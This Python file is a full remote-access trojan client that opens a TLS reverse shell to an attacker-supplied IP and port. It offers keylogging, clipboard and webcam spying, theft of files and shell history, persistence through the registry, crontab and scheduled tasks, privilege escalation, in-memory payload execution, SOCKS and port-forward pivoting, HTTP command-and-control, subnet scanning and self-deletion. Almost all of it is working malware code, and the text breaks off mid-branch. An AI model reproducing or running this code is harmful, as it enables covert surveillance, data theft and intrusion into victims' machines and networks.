import socket
import subprocess
import sys
import ssl
import os
import platform
import shutil
import base64
import random
import time
import datetime
import threading

if len(sys.argv) != 3:
    print(f"Usage: python3 {sys.argv[0]} <attacker_ip> <attacker_port>")
    sys.exit(1)

attacker_ip = sys.argv[1]
attacker_port = int(sys.argv[2])

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE  # For testing/self-signed only

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = context.wrap_socket(s, server_hostname=attacker_ip)
ssl_sock.connect((attacker_ip, attacker_port))
# Send authentication token
ssl_sock.send(SHARED_SECRET.encode())

LOG_FILE = f"client_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
def log_event(event):
    with open(LOG_FILE, 'a') as log:
        log.write(f"[{datetime.datetime.now().isoformat()}] {event}\n")

keylog_active = False
keylog_file = 'keylog.txt'
keylog_thread = None

def keylogger_worker():
    from pynput import keyboard
    with open(keylog_file, 'a') as log:
        def on_press(key):
            try:
                log.write(str(key.char))
            except AttributeError:
                log.write(f'<{key}>')
            log.flush()
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()

try:
    while True:
        data = ssl_sock.recv(1024)
        try:
            decoded = base64.b64decode(data).decode()
        except Exception:
            decoded = data.decode()
        log_event(f"Command received: {decoded}")
        if decoded.lower() == 'exit':
            break
        if decoded.startswith('upload '):
            remote_path = decoded.split(' ', 1)[1]
            size_bytes = ssl_sock.recv(8)
            size = int.from_bytes(size_bytes, 'big')
            b64data = b''
            while len(b64data) < size:
                chunk = ssl_sock.recv(min(4096, size - len(b64data)))
                if not chunk:
                    break
                b64data += chunk
            file_data = base64.b64decode(b64data)
            try:
                with open(remote_path, 'wb') as f:
                    f.write(file_data)
                resp = base64.b64encode(b'[+] Upload successful')
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Upload failed: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded.startswith('download '):
            remote_path = decoded.split(' ', 1)[1]
            if not os.path.isfile(remote_path):
                ssl_sock.send((0).to_bytes(8, 'big'))
                continue
            with open(remote_path, 'rb') as f:
                file_data = f.read()
            b64data = base64.b64encode(file_data)
            ssl_sock.send(len(b64data).to_bytes(8, 'big'))
            time.sleep(random.uniform(0,2))
            ssl_sock.sendall(b64data)
        elif decoded.lower() == 'persist':
            try:
                exe_path = os.path.abspath(sys.argv[0])
                system = platform.system().lower()
                if 'windows' in system:
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "ReverseShellClient", 0, winreg.REG_SZ, exe_path)
                    winreg.CloseKey(key)
                    ssl_sock.send(b'[+] Persistence added to Windows registry')
                elif 'linux' in system:
                    cron_line = f"@reboot python3 {exe_path}\n"
                    from crontab import CronTab
                    user_cron = CronTab(user=True)
                    for job in user_cron:
                        if exe_path in job.command:
                            break
                    else:
                        job = user_cron.new(command=f"python3 {exe_path}")
                        job.every_reboot()
                        user_cron.write()
                    ssl_sock.send(b'[+] Persistence added to Linux crontab')
                # TODO: Add MacOS persistence here
                else:
                    ssl_sock.send(b'[!] Persistence not supported on this OS')
            except Exception as e:
                ssl_sock.send(f'[!] Persistence error: {e}'.encode())
        elif decoded.startswith('screenshot '):
            try:
                import pyautogui
                import io
                remote_path = decoded.split(' ', 1)[1]
                screenshot = pyautogui.screenshot()
                buf = io.BytesIO()
                screenshot.save(buf, format='PNG')
                file_data = buf.getvalue()
                b64data = base64.b64encode(file_data)
                ssl_sock.send(len(b64data).to_bytes(8, 'big'))
                time.sleep(random.uniform(0,2))
                ssl_sock.sendall(b64data)
            except Exception as e:
                ssl_sock.send((0).to_bytes(8, 'big'))
        elif decoded == 'keylog_start':
            if not keylog_active:
                keylog_active = True
                keylog_thread = threading.Thread(target=keylogger_worker, daemon=True)
                keylog_thread.start()
                resp = base64.b64encode(b'[+] Keylogger started')
            else:
                resp = base64.b64encode(b'[!] Keylogger already running')
            time.sleep(random.uniform(0,2))
            ssl_sock.send(resp)
        elif decoded == 'keylog_stop':
            if keylog_active and keylog_thread:
                # No direct stop in pynput, so just set flag and let thread die naturally
                keylog_active = False
                resp = base64.b64encode(b'[+] Keylogger stopped (thread will exit on next key)')
            else:
                resp = base64.b64encode(b'[!] Keylogger not running')
            time.sleep(random.uniform(0,2))
            ssl_sock.send(resp)
        elif decoded == 'keylog_dump':
            try:
                with open(keylog_file, 'rb') as f:
                    file_data = f.read()
                b64data = base64.b64encode(file_data)
                ssl_sock.send(len(b64data).to_bytes(8, 'big'))
                time.sleep(random.uniform(0,2))
                ssl_sock.sendall(b64data)
            except Exception as e:
                ssl_sock.send((0).to_bytes(8, 'big'))
        elif decoded == 'clipboard':
            try:
                import pyperclip
                clipboard_data = pyperclip.paste()
                if not clipboard_data:
                    ssl_sock.send((0).to_bytes(8, 'big'))
                else:
                    b64data = base64.b64encode(clipboard_data.encode())
                    ssl_sock.send(len(b64data).to_bytes(8, 'big'))
                    time.sleep(random.uniform(0,2))
                    ssl_sock.sendall(b64data)
            except Exception as e:
                ssl_sock.send((0).to_bytes(8, 'big'))
        elif decoded.startswith('clipboard_monitor'):
            try:
                import threading, time, os
                import base64
                import pyperclip
                monitor_flag = globals().get('_clipboard_monitor_flag', None)
                monitor_thread = globals().get('_clipboard_monitor_thread', None)
                clipboard_log = 'clipboard_monitor_log.txt'
                def monitor():
                    last = ''
                    while globals()['_clipboard_monitor_flag']:
                        try:
                            data = pyperclip.paste()
                            if data != last:
                                with open(clipboard_log, 'a') as f:
                                    f.write(f'{time.ctime()}: {data}\n')
                                last = data
                        except Exception:
                            pass
                        time.sleep(1)
                if 'start' in decoded:
                    if monitor_flag:
                        resp = base64.b64encode(b'[!] Clipboard monitor already running.')
                    else:
                        globals()['_clipboard_monitor_flag'] = True
                        t = threading.Thread(target=monitor, daemon=True)
                        globals()['_clipboard_monitor_thread'] = t
                        t.start()
                        resp = base64.b64encode(b'[+] Clipboard monitor started.')
                elif 'stop' in decoded:
                    if monitor_flag:
                        globals()['_clipboard_monitor_flag'] = False
                        resp = base64.b64encode(b'[+] Clipboard monitor stopped.')
                    else:
                        resp = base64.b64encode(b'[!] Clipboard monitor not running.')
                elif 'dump' in decoded:
                    if os.path.isfile(clipboard_log):
                        with open(clipboard_log, 'rb') as f:
                            data = f.read()
                        resp = base64.b64encode(data)
                    else:
                        resp = base64.b64encode(b'[!] No clipboard log found.')
                else:
                    resp = base64.b64encode(b'[!] Usage: clipboard_monitor [start|stop|dump]')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Clipboard monitor error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('webcam '):
            try:
                import cv2
                import io
                remote_path = decoded.split(' ', 1)[1]
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if not ret:
                    ssl_sock.send((0).to_bytes(8, 'big'))
                else:
                    _, buf = cv2.imencode('.png', frame)
                    file_data = buf.tobytes()
                    b64data = base64.b64encode(file_data)
                    ssl_sock.send(len(b64data).to_bytes(8, 'big'))
                    time.sleep(random.uniform(0,2))
                    ssl_sock.sendall(b64data)
            except Exception as e:
                ssl_sock.send((0).to_bytes(8, 'big'))
        elif decoded == 'netinfo':
            try:
                import platform
                import socket
                import subprocess
                import json
                info = {}
                # Hostname and platform
                info['hostname'] = socket.gethostname()
                info['platform'] = platform.platform()
                # Local IPs
                info['local_ips'] = []
                try:
                    for iface in socket.getaddrinfo(socket.gethostname(), None):
                        ip = iface[4][0]
                        if ip not in info['local_ips']:
                            info['local_ips'].append(ip)
                except Exception:
                    pass
                # Routing table
                try:
                    if os.name == 'nt':
                        route = subprocess.check_output('route print', shell=True).decode(errors='ignore')
                    else:
                        route = subprocess.check_output('netstat -rn', shell=True).decode(errors='ignore')
                    info['routing_table'] = route
                except Exception:
                    info['routing_table'] = 'N/A'
                # Open ports
                try:
                    if os.name == 'nt':
                        ports = subprocess.check_output('netstat -ano', shell=True).decode(errors='ignore')
                    else:
                        ports = subprocess.check_output('netstat -tunlp', shell=True).decode(errors='ignore')
                    info['open_ports'] = ports
                except Exception:
                    info['open_ports'] = 'N/A'
                netinfo_str = json.dumps(info, indent=2)
                resp = base64.b64encode(netinfo_str.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Netinfo error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'sysinfo':
            try:
                import platform, socket, os, time, json
                info = {
                    'hostname': socket.gethostname(),
                    'platform': platform.platform(),
                    'os': os.name,
                    'release': platform.release(),
                    'version': platform.version(),
                    'architecture': platform.machine(),
                    'uptime': None
                }
                try:
                    if os.name == 'nt':
                        import ctypes
                        from ctypes import wintypes
                        class Uptime(ctypes.Structure):
                            _fields_ = [('IdleTime', wintypes.LARGE_INTEGER), ('KernelTime', wintypes.LARGE_INTEGER), ('UserTime', wintypes.LARGE_INTEGER)]
                        GetTickCount64 = ctypes.windll.kernel32.GetTickCount64
                        ms = GetTickCount64()
                        info['uptime'] = f"{ms//1000} seconds"
                    else:
                        with open('/proc/uptime') as f:
                            uptime_seconds = float(f.readline().split()[0])
                        info['uptime'] = f"{int(uptime_seconds)} seconds"
                except Exception:
                    pass
                resp = base64.b64encode(json.dumps(info, indent=2).encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Sysinfo error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'users':
            try:
                import os, platform, subprocess, json
                users = {}
                if os.name == 'nt':
                    out = subprocess.check_output('net user', shell=True).decode(errors='ignore')
                    users['all_users'] = out
                    out = subprocess.check_output('whoami', shell=True).decode(errors='ignore')
                    users['current_user'] = out.strip()
                else:
                    out = subprocess.check_output('cut -d: -f1 /etc/passwd', shell=True).decode(errors='ignore')
                    users['all_users'] = out
                    out = subprocess.check_output('whoami', shell=True).decode(errors='ignore')
                    users['current_user'] = out.strip()
                    out = subprocess.check_output('groups', shell=True).decode(errors='ignore')
                    users['groups'] = out.strip()
                resp = base64.b64encode(json.dumps(users, indent=2).encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Users error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'ps':
            try:
                import subprocess, os
                if os.name == 'nt':
                    out = subprocess.check_output('tasklist', shell=True).decode(errors='ignore')
                else:
                    out = subprocess.check_output('ps aux', shell=True).decode(errors='ignore')
                resp = base64.b64encode(out.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] PS error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded.startswith('ls '):
            try:
                import os, json
                path = decoded.split(' ', 1)[1]
                if not os.path.exists(path):
                    resp = base64.b64encode(f'[!] Path not found: {path}'.encode())
                else:
                    files = os.listdir(path)
                    resp = base64.b64encode(json.dumps(files, indent=2).encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] LS error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded.startswith('find '):
            try:
                import os, fnmatch, json
                pattern = decoded.split(' ', 1)[1]
                matches = []
                for root, dirs, files in os.walk('.'):
                    for name in files:
                        if fnmatch.fnmatch(name, pattern) or pattern in name:
                            matches.append(os.path.join(root, name))
                resp = base64.b64encode(json.dumps(matches, indent=2).encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Find error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'tasks':
            try:
                import os, subprocess
                if os.name == 'nt':
                    out = subprocess.check_output('schtasks', shell=True).decode(errors='ignore')
                else:
                    out = subprocess.check_output('crontab -l', shell=True).decode(errors='ignore')
                resp = base64.b64encode(out.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Tasks error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'services':
            try:
                import os, subprocess
                if os.name == 'nt':
                    out = subprocess.check_output('sc query state= all', shell=True).decode(errors='ignore')
                else:
                    out = subprocess.check_output('service --status-all', shell=True).decode(errors='ignore')
                resp = base64.b64encode(out.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Services error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'av':
            try:
                import os, subprocess, platform
                av_info = ''
                if os.name == 'nt':
                    try:
                        av_info = subprocess.check_output('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName', shell=True).decode(errors='ignore')
                    except Exception:
                        av_info = 'Could not query AV via WMIC.'
                else:
                    # Try common Linux AV products
                    avs = ['clamav', 'sophos', 'comodo', 'avg', 'avast', 'bitdefender']
                    found = []
                    for av in avs:
                        if subprocess.call(f'which {av}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                            found.append(av)
                    av_info = 'Installed AV: ' + ', '.join(found) if found else 'No common AV found.'
                resp = base64.b64encode(av_info.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] AV error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'netstat':
            try:
                import os, subprocess
                if os.name == 'nt':
                    out = subprocess.check_output('netstat -ano', shell=True).decode(errors='ignore')
                else:
                    out = subprocess.check_output('netstat -tunlp', shell=True).decode(errors='ignore')
                resp = base64.b64encode(out.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Netstat error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'recent':
            try:
                import os, subprocess, platform, json
                recent = {}
                # Shell history
                try:
                    if os.name == 'nt':
                        userprofile = os.environ.get('USERPROFILE', '')
                        history_path = os.path.join(userprofile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadline', 'ConsoleHost_history.txt')
                        if os.path.exists(history_path):
                            with open(history_path, 'r') as f:
                                recent['shell_history'] = f.read()[-2000:]
                        else:
                            recent['shell_history'] = 'Not found.'
                    else:
                        home = os.path.expanduser('~')
                        bash_hist = os.path.join(home, '.bash_history')
                        if os.path.exists(bash_hist):
                            with open(bash_hist, 'r') as f:
                                recent['shell_history'] = f.read()[-2000:]
                        else:
                            recent['shell_history'] = 'Not found.'
                except Exception:
                    recent['shell_history'] = 'Error.'
                # Recent files (Windows)
                if os.name == 'nt':
                    try:
                        userprofile = os.environ.get('USERPROFILE', '')
                        recent_dir = os.path.join(userprofile, 'Recent')
                        if os.path.exists(recent_dir):
                            files = os.listdir(recent_dir)
                            recent['recent_files'] = files
                        else:
                            recent['recent_files'] = 'Not found.'
                    except Exception:
                        recent['recent_files'] = 'Error.'
                # Browser history (try Chrome)
                try:
                    home = os.path.expanduser('~')
                    chrome_history = os.path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
                    if os.path.exists(chrome_history):
                        recent['chrome_history'] = 'Found (copy and parse with sqlite3 if needed)'
                    else:
                        recent['chrome_history'] = 'Not found.'
                except Exception:
                    recent['chrome_history'] = 'Error.'
                resp = base64.b64encode(json.dumps(recent, indent=2).encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Recent error: {e}'.encode())
                time.sleep(random.uniform(0,2))
                ssl_sock.send(resp)
        elif decoded == 'selfdestruct':
            try:
                import os, sys, platform, glob, time, random
                # Remove persistence
                try:
                    system = platform.system().lower()
                    exe_path = os.path.abspath(sys.argv[0])
                    if 'windows' in system:
                        try:
                            import winreg
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                            winreg.DeleteValue(key, "ReverseShellClient")
                            winreg.CloseKey(key)
                        except Exception:
                            pass
                    elif 'linux' in system:
                        try:
                            from crontab import CronTab
                            user_cron = CronTab(user=True)
                            jobs = [job for job in user_cron if exe_path in job.command]
                            for job in jobs:
                                user_cron.remove(job)
                            user_cron.write()
                        except Exception:
                            pass
                except Exception:
                    pass
                # Delete logs
                try:
                    for log in glob.glob('client_log_*.txt'):
                        os.remove(log)
                except Exception:
                    pass
                # Overwrite and delete self
                try:
                    with open(sys.argv[0], 'r+b') as f:
                        length = os.path.getsize(sys.argv[0])
                        f.write(os.urandom(length))
                    os.remove(sys.argv[0])
                except Exception:
                    pass
                resp = base64.b64encode(b'[+] Self-destruct complete. Exiting.')
                time.sleep(0.5)
                ssl_sock.send(resp)
                time.sleep(0.5)
                os._exit(0)
            except Exception as e:
                resp = base64.b64encode(f'[!] Self-destruct error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded == 'elevate':
            try:
                import os, sys, platform, subprocess
                system = platform.system().lower()
                if 'windows' in system:
                    try:
                        import ctypes
                        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                        if is_admin:
                            resp = base64.b64encode(b'[+] Already running as Administrator.')
                        else:
                            # Relaunch as admin
                            params = ' '.join([sys.executable] + sys.argv)
                            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
                            resp = base64.b64encode(b'[+] Elevation attempt triggered (UAC prompt shown).')
                    except Exception as e:
                        resp = base64.b64encode(f'[!] Elevation error: {e}'.encode())
                elif 'linux' in system:
                    try:
                        is_root = (os.geteuid() == 0)
                        if is_root:
                            resp = base64.b64encode(b'[+] Already running as root.')
                        else:
                            # Relaunch with sudo
                            subprocess.Popen(['sudo', sys.executable] + sys.argv)
                            resp = base64.b64encode(b'[+] Elevation attempt triggered (sudo prompt shown).')
                    except Exception as e:
                        resp = base64.b64encode(f'[!] Elevation error: {e}'.encode())
                else:
                    resp = base64.b64encode(b'[!] Elevation not supported on this OS.')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Elevate error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('execmem '):
            try:
                import base64, subprocess, sys, tempfile, os
                parts = decoded.split(' ', 2)
                if len(parts) != 3:
                    resp = base64.b64encode(b'[!] Usage: execmem <language> <base64_payload>')
                else:
                    lang, b64payload = parts[1], parts[2]
                    payload = base64.b64decode(b64payload).decode(errors='ignore')
                    if lang.lower() == 'python':
                        try:
                            # Execute Python code in memory
                            exec_globals = {}
                            exec(payload, exec_globals)
                            resp = base64.b64encode(b'[+] Python payload executed in memory.')
                        except Exception as e:
                            resp = base64.b64encode(f'[!] Python exec error: {e}'.encode())
                    elif lang.lower() == 'powershell' and os.name == 'nt':
                        try:
                            with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1') as tf:
                                tf.write(payload.encode())
                                tf.flush()
                                out = subprocess.check_output(['powershell', '-ExecutionPolicy', 'Bypass', '-File', tf.name], stderr=subprocess.STDOUT)
                            os.remove(tf.name)
                            resp = base64.b64encode(out)
                        except Exception as e:
                            resp = base64.b64encode(f'[!] PowerShell exec error: {e}'.encode())
                    elif lang.lower() == 'shellcode':
                        resp = base64.b64encode(b'[!] Shellcode execution not yet implemented.')
                    else:
                        resp = base64.b64encode(b'[!] Unsupported language.')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Execmem error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('stream '):
            try:
                import subprocess
                cmd = decoded.split(' ', 1)[1]
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, universal_newlines=True)
                for line in proc.stdout:
                    resp = base64.b64encode(line.encode())
                    ssl_sock.send(resp + b'\nSTREAMSEP\n')
                proc.stdout.close()
                proc.wait()
                ssl_sock.send(base64.b64encode(b'[+] Stream complete.') + b'\nSTREAMEND\n')
            except Exception as e:
                ssl_sock.send(base64.b64encode(f'[!] Stream error: {e}'.encode()) + b'\nSTREAMEND\n')
        elif decoded == 'upgrade_pty':
            try:
                import os, sys
                if os.name == 'posix':
                    import pty
                    import select
                    import tty
                    import termios
                    # Spawn a PTY shell
                    pid, fd = pty.fork()
                    if pid == 0:
                        os.execvp('/bin/bash', ['/bin/bash'])
                    else:
                        ssl_sock.send(base64.b64encode(b'[+] PTY upgrade started. Type exit to return.') + b'\nPTYSEP\n')
                        while True:
                            r, _, _ = select.select([fd, ssl_sock], [], [])
                            if fd in r:
                                try:
                                    data = os.read(fd, 1024)
                                    if not data:
                                        break
                                    ssl_sock.send(base64.b64encode(data) + b'\nPTYSEP\n')
                                except Exception:
                                    break
                            if ssl_sock in r:
                                chunk = b''
                                while not chunk.endswith(b'\nPTYSEP\n'):
                                    part = ssl_sock.recv(1024)
                                    if not part:
                                        break
                                    chunk += part
                                if chunk:
                                    try:
                                        cmd = base64.b64decode(chunk[:-8])
                                        os.write(fd, cmd)
                                    except Exception:
                                        break
                        ssl_sock.send(base64.b64encode(b'[+] PTY session ended.') + b'\nPTYEND\n')
                else:
                    ssl_sock.send(base64.b64encode(b'[!] PTY upgrade not supported on this OS.') + b'\nPTYEND\n')
            except Exception as e:
                ssl_sock.send(base64.b64encode(f'[!] PTY error: {e}'.encode()) + b'\nPTYEND\n')
        elif decoded == 'list_plugins':
            try:
                import os
                plugins = []
                if os.path.isdir('plugins'):
                    for f in os.listdir('plugins'):
                        if f.endswith('.py'):
                            plugins.append(f[:-3])
                resp = base64.b64encode(str(plugins).encode())
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] List plugins error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('load_plugin '):
            try:
                import importlib.util
                plugin_name = decoded.split(' ', 1)[1]
                plugin_path = os.path.join('plugins', plugin_name + '.py')
                if not os.path.isfile(plugin_path):
                    resp = base64.b64encode(f'[!] Plugin not found: {plugin_name}'.encode())
                else:
                    spec = importlib.util.spec_from_file_location(plugin_name, plugin_path)
                    mod = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(mod)
                    globals()[f'_plugin_{plugin_name}'] = mod
                    resp = base64.b64encode(f'[+] Plugin loaded: {plugin_name}'.encode())
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Load plugin error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('run_plugin '):
            try:
                parts = decoded.split(' ', 2)
                plugin_name = parts[1]
                args = parts[2] if len(parts) > 2 else ''
                mod = globals().get(f'_plugin_{plugin_name}')
                if not mod:
                    resp = base64.b64encode(f'[!] Plugin not loaded: {plugin_name}'.encode())
                else:
                    result = mod.run(args)
                    resp = base64.b64encode(str(result).encode())
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Run plugin error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('rpfwd '):
            try:
                import threading, socket
                parts = decoded.split(' ')
                if len(parts) != 4:
                    resp = base64.b64encode(b'[!] Usage: rpfwd <local_port> <remote_host> <remote_port>')
                    ssl_sock.send(resp)
                else:
                    local_port = int(parts[1])
                    remote_host = parts[2]
                    remote_port = int(parts[3])
                    def forwarder():
                        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        listener.bind(('0.0.0.0', local_port))
                        listener.listen(1)
                        while True:
                            client_sock, _ = listener.accept()
                            remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            remote_sock.connect((remote_host, remote_port))
                            def pipe(src, dst):
                                try:
                                    while True:
                                        data = src.recv(4096)
                                        if not data:
                                            break
                                        dst.sendall(data)
                                except:
                                    pass
                                finally:
                                    src.close()
                                    dst.close()
                            threading.Thread(target=pipe, args=(client_sock, remote_sock), daemon=True).start()
                            threading.Thread(target=pipe, args=(remote_sock, client_sock), daemon=True).start()
                    threading.Thread(target=forwarder, daemon=True).start()
                    resp = base64.b64encode(b'[+] Reverse port forward started.')
                    ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] RPFWD error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded == 'socks':
            try:
                import threading, socket
                import select
                def handle_client(client_sock):
                    # Minimal SOCKS5 handshake and relay
                    try:
                        client_sock.recv(262)
                        client_sock.sendall(b'\x05\x00')
                        req = client_sock.recv(4)
                        if len(req) < 4 or req[1] != 1:
                            client_sock.close()
                            return
                        addrtype = req[3]
                        if addrtype == 1:
                            addr = socket.inet_ntoa(client_sock.recv(4))
                        elif addrtype == 3:
                            domain_len = client_sock.recv(1)[0]
                            addr = client_sock.recv(domain_len)
                        else:
                            client_sock.close()
                            return
                        port = int.from_bytes(client_sock.recv(2), 'big')
                        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        remote.connect((addr, port))
                        client_sock.sendall(b'\x05\x00\x00\x01' + socket.inet_aton('0.0.0.0') + (1080).to_bytes(2, 'big'))
                        def pipe(src, dst):
                            try:
                                while True:
                                    data = src.recv(4096)
                                    if not data:
                                        break
                                    dst.sendall(data)
                            except:
                                pass
                            finally:
                                src.close()
                                dst.close()
                        threading.Thread(target=pipe, args=(client_sock, remote), daemon=True).start()
                        threading.Thread(target=pipe, args=(remote, client_sock), daemon=True).start()
                    except Exception:
                        client_sock.close()
                def socks_server():
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.bind(('0.0.0.0', 1080))
                    server.listen(5)
                    while True:
                        client_sock, _ = server.accept()
                        threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()
                threading.Thread(target=socks_server, daemon=True).start()
                resp = base64.b64encode(b'[+] SOCKS5 proxy started on port 1080.')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] SOCKS error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('c2_http '):
            try:
                import threading, requests, time, base64
                url = decoded.split(' ', 1)[1]
                def http_c2():
                    while True:
                        try:
                            r = requests.get(url)
                            if r.status_code == 200 and r.text.strip():
                                cmd = r.text.strip()
                                if cmd.lower() == 'exit':
                                    break
                                result = subprocess.check_output(cmd, shell=True).decode(errors='ignore')
                                requests.post(url, data=base64.b64encode(result.encode()))
                        except Exception:
                            pass
                        time.sleep(5)
                threading.Thread(target=http_c2, daemon=True).start()
                resp = base64.b64encode(b'[+] HTTP/S C2 started.')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] HTTP C2 error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('c2_dns '):
            try:
                resp = base64.b64encode(b'[!] DNS C2 not yet implemented (stub).')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] DNS C2 error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('c2_icmp '):
            try:
                resp = base64.b64encode(b'[!] ICMP C2 not yet implemented (stub).')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] ICMP C2 error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('lateral_move'):
            try:
                import socket, subprocess, os, platform, json
                parts = decoded.split(' ')
                action = parts[1] if len(parts) > 1 else ''
                arg = parts[2] if len(parts) > 2 else ''
                if not hasattr(globals(), '_lateral_results'):
                    globals()['_lateral_results'] = {'hosts': [], 'exploits': []}
                results = globals()['_lateral_results']
                if action == 'scan':
                    # Simple ping sweep on /24 subnet
                    local_ip = socket.gethostbyname(socket.gethostname())
                    subnet = '.'.join(local_ip.split('.')[:3])
                    live_hosts = []
                    for i in range(1, 255):
                        ip = f'{subnet}.{i}'
                        try:
                            if platform.system().lower() == 'windows':
                                out = subprocess.check_output(['ping', '-n', '1', '-w', '100', ip], stderr=subprocess.DEVNULL)
                            else:
                                out = subprocess.check_output(['ping', '-c', '1', '-W', '1', ip], stderr=subprocess.DEVNULL)
                            live_hosts.append(ip)
                        except Exception:
                            continue
                    results['hosts'] = live_hosts
                    resp = base64.b64encode(json.dumps({'live_hosts': live_hosts}).encode())
                elif action == 'exploit' and arg:
                    # Stub: Try SSH default creds (future extension)
                    results['exploits'].append({'target': arg, 'result': 'Exploit stub (not implemented).'})
                    resp = base64.b64encode(b'[!] Exploit not yet implemented.')
                elif action == 'report':
                    resp = base64.b64encode(json.dumps(results).encode())
                else:
                    resp = base64.b64encode(b'[!] Usage: lateral_move [scan|exploit|report] [args]')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Lateral move error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded == 'persist_task':
            try:
                import os, sys, platform, subprocess
                system = platform.system().lower()
                exe_path = os.path.abspath(sys.argv[0])
                if 'windows' in system:
                    # Scheduled Task persistence
                    task_name = 'ReverseShellTask'
                    cmd = f'schtasks /Create /SC ONLOGON /TN {task_name} /TR "{sys.executable} {exe_path}" /F'
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode(errors='ignore')
                    resp = base64.b64encode(f'[+] Scheduled Task persistence added.\n{out}'.encode())
                elif 'linux' in system:
                    # systemd persistence
